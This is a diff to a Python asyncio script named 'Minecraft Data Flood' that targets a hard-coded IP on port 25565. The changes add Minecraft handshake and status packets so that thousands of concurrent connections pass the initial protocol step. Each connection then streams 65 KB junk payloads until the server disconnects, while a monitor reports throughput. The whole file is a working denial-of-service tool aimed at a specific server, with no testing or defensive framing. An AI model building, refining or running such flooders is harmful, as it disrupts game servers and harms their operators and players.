@@ -1,40 +1,90 @@
 """
-Minecraft Data Flood - asyncio 10000 tasks
+Minecraft Data Flood - 10000 tasks with proper handshake
 """
-import socket, time, sys, asyncio
+import socket, time, sys, asyncio, struct, hashlib
 from colorama import init, Fore
 init(autoreset=True)
 
 TARGET_IP = "5.133.100.33"
 TARGET_PORT = 25565
-TASK_COUNT = 10000
+TASK_COUNT = 5000
 TEST_DURATION = 30
-PAYLOAD_SIZE = 65500
+PAYLOAD_SIZE = 65000
 PAYLOAD = b'x' * PAYLOAD_SIZE
+
+# ─── MINECRAFT PACKET HELPERS ─────────────────────────────────────────────────
+def varint(val):
+    out = b''
+    while True:
+        b = val & 0x7F
+        val >>= 7
+        if val:
+            out += bytes([b | 0x80])
+        else:
+            out += bytes([b])
+            break
+    return out
+
+def pstr(s):
+    e = s.encode('utf-8')
+    return varint(len(e)) + e
+
+def make_handshake(ip, port, nstate):
+    h = varint(0x00) + varint(767) + pstr(ip) + struct.pack('>H', port) + varint(nstate)
+    return varint(len(h)) + h
+
+def make_status_req():
+    r = varint(0x00)
+    return varint(len(r)) + r
+
+# ─── CACHED PACKETS ───────────────────────────────────────────────────────────
+HANDSHAKE_STATUS = make_handshake(TARGET_IP, TARGET_PORT, 1)
+STATUS_REQ = make_status_req()
 
 bytes_sent = 0
 connections = 0
 errors = 0
+packets_sent = 0
 lock = asyncio.Lock()
 
 async def flood_task(stop):
-    global bytes_sent, connections, errors
+    global bytes_sent, connections, errors, packets_sent
     loop = asyncio.get_running_loop()
     while not stop.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.settimeout(3.0)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(5.0)
             s.setblocking(False)
             await asyncio.wait_for(loop.sock_connect(s, (TARGET_IP, TARGET_PORT)), timeout=3.0)
-            await loop.sock_sendall(s, PAYLOAD)
+
+            # Send handshake + status req
+            await loop.sock_sendall(s, HANDSHAKE_STATUS)
+            await loop.sock_sendall(s, STATUS_REQ)
+
             async with lock:
-                bytes_sent += len(PAYLOAD)
                 connections += 1
-            s.close()
+
+            # Now keep sending data until server disconnects
+            while not stop.is_set():
+                await loop.sock_sendall(s, PAYLOAD)
+                async with lock:
+                    bytes_sent += len(PAYLOAD)
+                    packets_sent += 1
+
+        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, OSError):
+            async with lock:
+                errors += 1
+        except asyncio.TimeoutError:
+            async with lock:
+                errors += 1
         except Exception:
             async with lock:
                 errors += 1
+        finally:
+            try: s.close()
+            except: pass
 
 async def monitor(stop, start_time, tasks):
     while not stop.is_set():
@@ -44,7 +94,7 @@ async def monitor(stop, start_time, tasks):
             stop.set()
             break
         async with lock:
-            b = bytes_sent; c = connections; e = errors
+            b = bytes_sent; c = connections; e = errors; p = packets_sent
         rate = b / max(elapsed, 0.1)
         mbps = rate * 8 / 1_000_000
         er = (e / max(c + e, 1)) * 100
@@ -52,6 +102,7 @@ async def monitor(stop, start_time, tasks):
         print(f"\r[TIME] {elapsed:.0f}s | "
               f"[DATA] {b/1_000_000:.1f}MB | "
               f"[RATE] {mbps:.0f}Mbps | "
+              f"[PKTS] {p:,} | "
               f"[CONN] {c} ({c/max(elapsed,0.1):.0f}/s) | "
               f"[ERR] {e} ({er:.1f}%) | "
               f"[TASKS] {alive}/{len(tasks)}", end="", flush=True)
@@ -79,7 +130,7 @@ async def main_async():
 
     elapsed = time.time() - start
     async with lock:
-        b = bytes_sent; c = connections; e = errors
+        b = bytes_sent; c = connections; e = errors; p = packets_sent
     rate = b / max(elapsed, 0.1)
     mbps = rate * 8 / 1_000_000
     er = (e / max(c + e, 1)) * 100
@@ -88,6 +139,7 @@ async def main_async():
     print(f"[TIME] {elapsed:.1f}s")
     print(f"[DATA] {b/1_000_000:.1f}MB ({b:,} bytes)")
     print(f"[RATE] {mbps:.0f}Mbps ({rate:.0f} B/s)")
+    print(f"[PKTS] {p:,} packets")
     print(f"[CONN] {c:,} ({c/max(elapsed,0.1):.0f}/s)")
     print(f"[ERR] {e:,} ({er:.1f}%)")
 
